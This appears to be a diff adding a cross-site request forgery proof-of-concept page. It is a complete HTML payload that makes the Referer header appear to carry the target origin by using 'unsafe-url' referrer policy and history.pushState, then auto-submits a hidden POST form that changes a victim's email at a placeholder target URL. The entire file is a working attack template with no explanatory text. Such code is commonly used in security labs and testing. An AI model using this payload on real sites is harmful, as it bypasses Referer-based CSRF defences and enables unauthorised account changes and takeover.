@@ -1,0 +1,15 @@
+<html>
+<head>
+  <meta name="referrer" content="unsafe-url">
+</head>
+<body>
+  <form action="https://TARGET_ORIGIN/PATH" method="POST">
+    <input type="hidden" name="email" value="test@example.com">
+  </form>
+  <script>
+    history.pushState('', '', '/?TARGET_ORIGIN/PATH');
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
+
